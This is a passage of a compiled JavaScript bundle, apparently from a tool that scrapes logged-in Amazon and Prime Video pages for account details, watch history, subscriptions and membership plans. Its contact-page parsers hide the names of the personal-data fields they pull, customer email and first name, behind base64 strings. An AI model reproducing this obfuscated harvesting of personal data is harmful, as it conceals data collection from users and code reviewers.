                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}


function setOptsValues(html) {
    var sequence = "var opts = ";
    var idx = html.search(sequence) + sequence.length;
    if (idx < sequence.length) {
        return;
    }
    var subJSON = html.substring(idx);
    subJSON = subJSON.replace(new RegExp("\\\\x", "g"), "\\u00");
    var optsJson = (0,_Helper_Json__WEBPACK_IMPORTED_MODULE_1__/* .extractByCountingBraces */ .Nw)(subJSON);
    return JSON.parse((0,_Helper_Json__WEBPACK_IMPORTED_MODULE_1__/* .sanitize */ .G7)(optsJson));
}
function setNavManagerValues(html, localWindow) {
    var nav = {};
    nav.manager = {};
    nav.manager.get = function(valueKey) {
        return nav[valueKey];
    };
    var myRegexp = /\$Nav\.declare\('config\.isPrimeMember',(true|false)\)/;
    var match = myRegexp.exec(html);
    if (match && match.length >= 2) {
        nav["config.isPrimeMember"] = match[1];
    }
    myRegexp = /\$Nav\.declare\('config\.customerName',(.*)\)/;
    match = myRegexp.exec(html);
    if (match && match.length >= 2) {
        nav["config.customerName"] = match[1];
    }
    return nav;
}
function init(domain) {
    return _init.apply(this, arguments);
}
function _init() {
    _init = _async_to_generator(function(domain) {
        var localWindow, protocol, html;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    localWindow = {};
                    protocol = "https:";
                    localWindow.navigator = {
                        language: ""
                    };
                    try {
                        localWindow.navigator.language = globalThis.window.navigator.language;
                    } catch (e) {
                    // ignore this error, as navigator is only available in browsers and this code is executed also in desktop executor
                    }
                    localWindow.location = {
                        host: domain,
                        protocol: protocol,
                        href: "".concat(protocol, "//").concat(domain)
                    };
                    localWindow.opts = {};
                    return [
                        4,
                        (0,_Http_Http__WEBPACK_IMPORTED_MODULE_0__/* .http */ .dJ)(localWindow.location.href, "GET", null, null, function(e) {
                            (0,_Http_Http__WEBPACK_IMPORTED_MODULE_0__/* .httpNodeLog */ .gp)("getting amazon home page error: ".concat(e));
                        }, false, false)
                    ];
                case 1:
                    html = _state.sent();
                    localWindow.document = {
                        documentElement: {
                            innerHTML: html
                        }
                    };
                    localWindow.servicesNames = {
                        "www.amazon.com": "amazon.com",
                        "www.amazon.de": "amazon.de",
                        "www.amazon.co.uk": "amazon.co.uk",
                        "www.amazon.co.jp": "amazon.co.jp",
                        "www.primevideo.com": "primevideo"
                    };
                    localWindow.opts = setOptsValues(html);
                    localWindow.$Nav = setNavManagerValues(html);
                    return [
                        2,
                        localWindow
                    ];
            }
        });
    });
    return _init.apply(this, arguments);
}


/***/ }),

/***/ 140:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {


// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "Jj": function() { return /* binding */ AMAZON_DOMAINS; },
  "h9": function() { return /* binding */ AUTH_COOKIE_BY_DOMAIN; },
  "W0": function() { return /* binding */ provideApi; }
});

// EXTERNAL MODULE: ./src/Http/Http.js
var Http = __webpack_require__(519);
;// CONCATENATED MODULE: ./src/Helper/UrlGenerator.js
var UrlGenerator_buildUrl = function(path, window) {
    return "".concat(window.location.protocol, "//").concat(window.location.host).concat(path);
};
var getQueryStringFromObject = function(obj) {
    return Object.keys(obj).map(function(key) {
        return "".concat(key, "=").concat(obj[key]);
    }).join("&");
};

// EXTERNAL MODULE: ./src/Helper/Helper.js + 1 modules
var Helper = __webpack_require__(667);
// EXTERNAL MODULE: ./src/Helper/Json.js
var Json = __webpack_require__(425);
// EXTERNAL MODULE: ./src/Resolver/Hunters/Amazon/Site/Common/CommonParser.js + 3 modules
var Common_CommonParser = __webpack_require__(116);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Dto/Channel.js
function _class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
var Channel = function Channel(name, renewalDate, price, refundUrl) {
    "use strict";
    _class_call_check(this, Channel);
    this.name = name;
    this.renewalDate = renewalDate;
    this.price = price;
    this.refundUrl = refundUrl;
};


// EXTERNAL MODULE: ./src/Helper/Base64.js
var Base64 = __webpack_require__(181);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Site/Amazon/AmazonParser.js
function _instanceof(left, right) {
    if (right != null && typeof Symbol !== "undefined" && right[Symbol.hasInstance]) {
        return !!right[Symbol.hasInstance](left);
    } else {
        return left instanceof right;
    }
}







/**
 * @param {int} page
 * @param {string} documentText
 * @return {History}
 */ function parseHistory(page, documentText) {
    var document = CommonParser.createDocument(documentText), rows = document.querySelectorAll('tr[id^="iyrListItem"]'), items = Array.prototype.map.call(rows, parseItem);
    return new History(page, items, documentText.indexOf("iyrNext") === -1);
}
/**
 * @param {Element} row
 * @return {Item}
 */ function parseItem(row) {
    var id = row.getAttribute("id").replace(/iyrListItem/, ""), index = row.querySelector("#iyrListCount".concat(id, " b")), link = row.querySelector("#iyrListItemTitle".concat(id, " a")), rating = row.querySelector(".currentStarRating_".concat(id));
    return new Item(parseInt(index ? index.textContent : null, 10), id, link ? link.getAttribute("href") : null, link ? link.textContent.trim() : null, parseInt(rating ? rating.getAttribute("value") : 0, 10));
}
/**
 * @param {string} documentText
 * @returns {Details}
 */ function parseDetails(documentText) {
    return Common_CommonParser/* parseDetails */.jF(documentText);
}
/**
 * @param {Window} window
 * @returns {boolean}
 */ function AmazonParser_isPrimeMember(window) {
    var value = navManagerGet(window, "config.isPrimeMember");
    if (typeof value === "string") {
        return value.toLowerCase() === "true";
    }
    return value === true;
}
/**
 * @param {Window} window
 * @returns {string|null}
 */ function AmazonParser_getUserId(window) {
    return (0,Helper/* extract */.Kl)(window, [
        "opts",
        "customerId"
    ]);
}
/**
 * @param {Window} window
 * @returns {string|null}
 */ function AmazonParser_getUserName(window) {
    return navManagerGet(window, "config.customerName");
}
/**
 * @param {Window} window
 * @returns {string}
 */ function AmazonParser_getLanguage(window) {
    return (0,Helper/* extract */.Kl)(window, [
        "opts",
        "language"
    ]);
}
/**
 * @param {Window} window
 * @param {string} key
 * @returns {*}
 */ function navManagerGet(window, key) {
    var navManagerGetFunction = (0,Helper/* extract */.Kl)(window, [
        "$Nav",
        "manager",
        "get"
    ]);
    if (typeof navManagerGetFunction !== "function") {
        return null;
    }
    return navManagerGetFunction(key);
}
/**
 * @param {string} documentText
 * @returns {Channel[]}
 */ function parseChannels(documentText) {
    var document = Common_CommonParser/* createDocument */.OE(documentText);
    return findChannels(document);
}
/**
 * @param {Document} document
 * @returns {Channel[]}
 */ function findChannels(document) {
    return findChannelRows(document).map(createChannel);
}
/**
 * @param {Document} document
 * @returns {HTMLTableRowElement[]}
 */ function findChannelRows(document) {
    var channelsSection = findChannelsSection(document);
    if (channelsSection === undefined) {
        return [];
    }
    return findTableRows(channelsSection).filter(isChannelRow);
}
/**
 * @param {Document} document
 * @returns {HTMLDivElement|null}
 */ function findChannelsSection(document) {
    return findSections(document).find(hasChannelsHeader);
}
/**
 * @param {Document} document
 * @returns {HTMLDivElement[]}
 */ function findSections(document) {
    return Array.from(document.querySelectorAll(".a-section"));
}
/**
 * @param {HTMLDivElement} section
 * @returns {boolean}
 */ function hasChannelsHeader(section) {
    var channelsHeaderText = "Prime Video Channels", header = findSectionHeader(section);
    if (header === null) {
        return false;
    }
    return header.textContent.trim() === channelsHeaderText;
}
/**
 * @param {HTMLDivElement} section
 * @returns {HTMLHeadingElement}
 */ function findSectionHeader(section) {
    for(var element = section.previousElementSibling; element !== null; element = element.previousElementSibling){
        if (_instanceof(element, HTMLHeadingElement)) {
            return element;
        }
    }
    return null;
}
/**
 * @param {HTMLDivElement} section
 * @returns {HTMLTableRowElement[]}
 */ function findTableRows(section) {
    return Array.from(section.querySelector("table").querySelectorAll("tr"));
}
/**
 * @param {HTMLTableRowElement} row
 * @returns {boolean}
 */ function isChannelRow(row) {
    return !isTableHeader(row) && !isEmptyRow(row);
}
/**
 * @param {HTMLTableRowElement} row
 * @returns {boolean}
 */ function isTableHeader(row) {
    return row.querySelectorAll("th").length > 0;
}
/**
 * @param {HTMLTableRowElement} row
 * @returns {boolean}
 */ function isEmptyRow(row) {
    return row.getElementsByTagName("td").length !== 5;
}
/**
 * @param {HTMLTableRowElement} row
 * @returns {Channel}
 */ function createChannel(row) {
    var fields = Array.from(row.querySelectorAll("td"));
    return new Channel(getText(fields[0].querySelector("p")), getText(fields[1]), getText(fields[2]), fields[3] && fields[3].getElementsByTagName("a") && fields[3].getElementsByTagName("a")[0] && fields[3].getElementsByTagName("a")[0].getAttribute("href"));
}
/**
 * @param {HTMLElement} element
 * @returns {string}
 */ function getText(element) {
    return Array.from(element.childNodes).filter(isTextNode).map(function(node) {
        return node.textContent.trim();
    }).join("");
}
/**
 * @param {Node} node
 * @returns {boolean}
 */ function isTextNode(node) {
    return node.nodeType === Node.TEXT_NODE;
}
/**
 * @param {string} documentText
 * @returns {string}
 */ function parseMembershipPlan(documentText) {
    var document = Common_CommonParser/* createDocument */.OE(documentText);
    var paymentSection = document.querySelector('[data-automation-id="membership-payment"]');
    if (!paymentSection) {
        return {
            planName: null,
            hasAds: null,
            renewalPrice: null
        };
    }
    var planNameElement = paymentSection.querySelector("h3");
    var planName = planNameElement ? planNameElement.textContent.trim() : null;
    var adFreeLabel = paymentSection.querySelector('[data-testid="header-label-badge"]');
    var adFree = adFreeLabel && adFreeLabel.textContent === "AD FREE" || null;
    var renewalPriceElement = paymentSection.querySelector('[data-automation-id="membership-renewal-price"]');
    var renewalPrice = renewalPriceElement ? renewalPriceElement.textContent.trim() : null;
    var result = {
        planName: planName,
        hasAds: adFree,
        renewalPrice: renewalPrice
    };
    return result;
}
/**
 * @param {string} documentText
 * @returns {string}
 */ function parseCountry(documentText) {
    return Common_CommonParser/* parseCountry */.ow(documentText);
}
function parseContactPage(documentText) {
    var PI_FIELDS = [
        "Y3VzdG9tZXJNb2RlbC5lbWFpbC52YWx1ZQ==",
        "Y3VzdG9tZXJGaXJzdE5hbWU="
    ];
    var json = (0,Json/* extract */.Kl)(documentText, "window._fsAppState=").object;
    var data = {};
    var _iteratorNormalCompletion = true, _didIteratorError = false, _iteratorError = undefined;
    try {
        for(var _iterator = PI_FIELDS[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true){
            var field = _step.value;
            var decodedField = (0,Base64/* b64decode */.F)(field);
            data[decodedField] = (0,Helper/* extract */.Kl)(json, decodedField.split("."));
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally{
        try {
            if (!_iteratorNormalCompletion && _iterator.return != null) {
                _iterator.return();
            }
        } finally{
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }
    return data;
}

;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Site/Common/CommonApi.js
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function _async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}



var CONFIG_PAGE_URI = "/gp/video/storefront/";
var PROFILES_PAGE_URI = "/hp/video/api/getProfiles";
/**
 * @param {string} url
 * @returns {Promise<Bookmarks>}
 */ function CommonApi_fetchBookmarks(url) {
    return _fetchBookmarks.apply(this, arguments);
}
function _fetchBookmarks() {
    _fetchBookmarks = _async_to_generator(function(url) {
        return _ts_generator(this, function(_state) {
            return [
                2,
                (0,Http/* requestJson */.aA)("GET", url, null, true)
            ];
        });
    });
    return _fetchBookmarks.apply(this, arguments);
}
/**
 * @param {string} url
 * @returns {Promise<History>}
 */ function CommonApi_fetchHistory(url) {
    return _fetchHistory.apply(this, arguments);
}
function _fetchHistory() {
    _fetchHistory = _async_to_generator(function(url) {
        return _ts_generator(this, function(_state) {
            return [
                2,
                (0,Http/* requestJson */.aA)("GET", url, null, true)
            ];
        });
    });
    return _fetchHistory.apply(this, arguments);
}
/**
 * @param {string} url
 * @returns {Promise<ContinueWatching>}
 */ function CommonApi_fetchProfiles(url) {
    return _fetchProfiles.apply(this, arguments);
}
function _fetchProfiles() {
    _fetchProfiles = _async_to_generator(function(url) {
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        (0,Http/* requestJson */.aA)("GET", url, null, true)
                    ];
                case 1:
                    return [
                        2,
                        _state.sent()
                    ];
            }
        });
    });
    return _fetchProfiles.apply(this, arguments);
}
/**
 * @param {string} url
 * @returns {Promise<Subscriptions>}
 */ function CommonApi_fetchActiveChannels(url) {
    return _fetchActiveChannels.apply(this, arguments);
}
function _fetchActiveChannels() {
    _fetchActiveChannels = _async_to_generator(function(url) {
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        (0,Http/* requestJson */.aA)("GET", url, null, true)
                    ];
                case 1:
                    return [
                        2,
                        _state.sent()
                    ];
            }
        });
    });
    return _fetchActiveChannels.apply(this, arguments);
}
/**
 * @param {object} window
 * @returns {string|null}
 */ function CommonApi_getCurrentProfileId(window) {
    return _getCurrentProfileId.apply(this, arguments);
}
function _getCurrentProfileId() {
    _getCurrentProfileId = _async_to_generator(function(window) {
        return _ts_generator(this, function(_state) {
            return [
                2,
                (0,Http/* requestJson */.aA)("GET", UrlGenerator_buildUrl(PROFILES_PAGE_URI, window), null, true).then(Common_CommonParser/* parseForCurrentProfileId */.GA)
            ];
        });
    });
    return _getCurrentProfileId.apply(this, arguments);
}
/**
 * @param {string} id
 * @param {string} url
 * @returns {Promise}
 */ function fetchDetails(id, url) {
    return _fetchDetails.apply(this, arguments);
}
function _fetchDetails() {
    _fetchDetails = _async_to_generator(function(id, url) {
        return _ts_generator(this, function(_state) {
            return [
                2,
                new Promise(function(resolve, reject) {
                    http(url, "GET", null, function(request) {
                        return resolve(CommonParser.parseDetails(request.response));
                    }, reject);
                })
            ];
        });
    });
    return _fetchDetails.apply(this, arguments);
}
/**
 * @param {object} window
 * @returns {Promise<string>}
 */ function getCountry(window) {
    return _getCountry.apply(this, arguments);
}
function _getCountry() {
    _getCountry = _async_to_generator(function(window) {
        return _ts_generator(this, function(_state) {
            return [
                2,
                new Promise(function(resolve, reject) {
                    http(buildUrl(CONFIG_PAGE_URI, window), "GET", null, resolve, reject);
                }).then(function(param) {
                    var response = param.response;
                    return response;
                }).then(CommonParser.parseCountry)
            ];
        });
    });
    return _getCountry.apply(this, arguments);
}

;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Site/Amazon/AmazonApi.js
function AmazonApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function AmazonApi_async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                AmazonApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                AmazonApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function AmazonApi_class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
function _defineProperties(target, props) {
    for(var i = 0; i < props.length; i++){
        var descriptor = props[i];
        descriptor.enumerable = descriptor.enumerable || false;
        descriptor.configurable = true;
        if ("value" in descriptor) descriptor.writable = true;
        Object.defineProperty(target, descriptor.key, descriptor);
    }
}
function _create_class(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
}
function AmazonApi_ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}




var CHANNELS_PAGE_URI = "/gp/video/subscriptions/manage/";
var AmazonApi_CONFIG_PAGE_URI = "/gp/video/storefront/";
var PLAN_MEMBERSHIP_PAGE_URI = "/gp/video/settings/your-account";
var AmazonApi = /*#__PURE__*/ function() {
    "use strict";
    function AmazonApi(window) {
        AmazonApi_class_call_check(this, AmazonApi);
        this.window = window;
    }
    _create_class(AmazonApi, [
        {
            key: "fetchBookmarks",
            value: /**
   * @param {string} url
   * @returns {Promise<Bookmarks>}
   */ function fetchBookmarks(url) {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            CommonApi_fetchBookmarks(UrlGenerator_buildUrl(url, _this.window))
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchHistory",
            value: /**
   * @param {string} url
   * @returns {Promise<History>}
   */ function fetchHistory(url) {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            CommonApi_fetchHistory(UrlGenerator_buildUrl(url, _this.window))
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchProfiles",
            value: /**
   * @param {string} url
   * @returns {Promise<ContinueWatching>}
   */ function fetchProfiles(url) {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    CommonApi_fetchProfiles(UrlGenerator_buildUrl(url, _this.window))
                                ];
                            case 1:
                                return [
                                    2,
                                    _state.sent()
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "fetchActiveChannels",
            value: /**
   * @param {string} url
   * @returns {Promise<Subscriptions>}
   */ function fetchActiveChannels(url) {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    CommonApi_fetchActiveChannels(UrlGenerator_buildUrl(url, _this.window))
                                ];
                            case 1:
                                return [
                                    2,
                                    _state.sent()
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "getCurrentProfileId",
            value: /**
   * @returns {Promise<string|null>}
   */ function getCurrentProfileId() {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            CommonApi_getCurrentProfileId(_this.window)
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchDetails",
            value: /**
   * @param {string} id
   * @param {string} url
   * @returns {Promise<Details>}
   */ function fetchDetails(id, url) {
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            new Promise(function(resolve, reject) {
                                (0,Http/* http */.dJ)(url, "GET", null, function(request) {
                                    return resolve(parseDetails(request.response));
                                }, reject);
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "isPrimeMember",
            value: /**
   * @returns {Promise<boolean>}
   */ function isPrimeMember() {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            AmazonParser_isPrimeMember(_this.window)
                        ];
                    });
                })();
            }
        },
        {
            /**
   * @returns {string|null}
   */ key: "getUserId",
            value: function getUserId() {
                return AmazonParser_getUserId(this.window);
            }
        },
        {
            /**
   * @returns {string|null}
   */ key: "getUserName",
            value: function getUserName() {
                return AmazonParser_getUserName(this.window);
            }
        },
        {
            /**
   * @returns {string}
   */ key: "getLanguage",
            value: function getLanguage() {
                return AmazonParser_getLanguage(this.window);
            }
        },
        {
            /**
   * @returns {Promise<string>}
   */ key: "getCountry",
            value: function getCountry() {
                var _this = this;
                return new Promise(function(resolve, reject) {
                    (0,Http/* http */.dJ)(UrlGenerator_buildUrl(AmazonApi_CONFIG_PAGE_URI, _this.window), "GET", null, function(request) {
                        return resolve(parseCountry(request.responseText));
                    }, reject);
                });
            }
        },
        {
            key: "fetchChannels",
            value: /**
   * @returns {Promise<Channel[]>}
   */ function fetchChannels() {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            new Promise(function(resolve, reject) {
                                (0,Http/* http */.dJ)(UrlGenerator_buildUrl(CHANNELS_PAGE_URI, _this.window), "GET", null, function(request) {
                                    return resolve(parseChannels(request.response));
                                }, reject);
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchMembershipPlan",
            value: /**
   * @returns {Promise<MembershipPlan>}
   */ function fetchMembershipPlan() {
                var _this = this;
                return AmazonApi_async_to_generator(function() {
                    return AmazonApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            new Promise(function(resolve, reject) {
                                (0,Http/* http */.dJ)(UrlGenerator_buildUrl(PLAN_MEMBERSHIP_PAGE_URI, _this.window), "GET", null, function(request) {
                                    return resolve(parseMembershipPlan(request.responseText));
                                }, reject);
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "getContactPageData",
            value: function getContactPageData() {
                return AmazonApi_async_to_generator(function() {
                    var response, document;
                    return AmazonApi_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    fetch("https://www.amazon.com/hz/contact-us", {
                                        method: "GET",
                                        mode: "cors",
                                        credentials: "include"
                                    })
                                ];
                            case 1:
                                response = _state.sent();
                                return [
                                    4,
                                    response.text()
                                ];
                            case 2:
                                document = _state.sent();
                                return [
                                    2,
                                    parseContactPage(document)
                                ];
                        }
                    });
                })();
            }
        }
    ]);
    return AmazonApi;
}();


;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Site/PrimeVideo/PrimeVideoParser.js




/**
 * @param {string} documentText
 * @returns {boolean|null}
 */ function isPrimeMember(documentText) {
    return null;
}
/**
 * @param {string} documentText
 * @returns {Details}
 */ function PrimeVideoParser_parseDetails(documentText) {
    return Common_CommonParser/* parseDetails */.jF(documentText);
}
/**
 * @param {string} documentText
 * @returns {string|null}
 */ function PrimeVideoParser_getUserId(documentText) {
    return Common_CommonParser/* extractProp */.ig(documentText, [
        "context",
        "customerID"
    ]);
}
/**
 * @param {string} documentText
 * @returns {string|null}
 */ function PrimeVideoParser_getUserName(documentText) {
    return Common_CommonParser/* extractProp */.ig(documentText, [
        "firstName"
    ]);
}
/**
 * @param {string} documentText
 * @returns {string}
 */ function PrimeVideoParser_getLanguage(documentText) {
    return Common_CommonParser/* extractProp */.ig(documentText, [
        "context",
        "currentTerritory"
    ]);
}
/**
 * @param {string} document
 * @returns {string}
 */ function PrimeVideoParser_parseCountry(document) {
    return Common_CommonParser/* parseCountry */.ow(document);
}
/**
 * @param {string} documentText
 * @returns {string}
 */ function PrimeVideoParser_parseMembershipPlan(documentText) {
    var document = Common_CommonParser/* createDocument */.OE(documentText);
    var paymentSection = document.querySelector('[data-automation-id="membership-payment"]');
    if (!paymentSection) {
        return {
            planName: null,
            hasAds: null,
            renewalPrice: null
        };
    }
    var planNameElement = paymentSection.querySelector("h3");
    var planName = planNameElement ? planNameElement.textContent.trim() : null;
    var adFreeLabel = paymentSection.querySelector('[data-testid="header-label-badge"]');
    var adFree = adFreeLabel && adFreeLabel.textContent === "AD FREE";
    var renewalPriceElement = paymentSection.querySelector('[data-automation-id="membership-renewal-price"]');
    var renewalPrice = renewalPriceElement ? renewalPriceElement.textContent.trim() : null;
    var result = {
        planName: planName,
        hasAds: adFree,
        renewalPrice: renewalPrice
    };
    return result;
}
function PrimeVideoParser_parseContactPage(documentText) {
    var PI_FIELDS = [
        "ZW1haWxPcHRpb25zLmN1c3RvbWVyRW1haWxBZGRyZXNz"
    ];
    var json = (0,Json/* extract */.Kl)(documentText, '{"props":{"landmark":"Help","main":').object;
    var data = {
        recordTerritory: Common_CommonParser/* extractProp */.ig(documentText, [
            "context",
            "currentTerritory"
        ]),
        currentTerritory: Common_CommonParser/* extractProp */.ig(documentText, [
            "context",
            "currentTerritory"
        ])
    };
    var _iteratorNormalCompletion = true, _didIteratorError = false, _iteratorError = undefined;
    try {
        for(var _iterator = PI_FIELDS[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true){
            var field = _step.value;
            var decodedField = (0,Base64/* b64decode */.F)(field);
            data[decodedField] = (0,Helper/* extract */.Kl)(json.widgetOptions, decodedField.split("."));
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally{
        try {
            if (!_iteratorNormalCompletion && _iterator.return != null) {
                _iterator.return();
            }
        } finally{
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }
    return data;
}

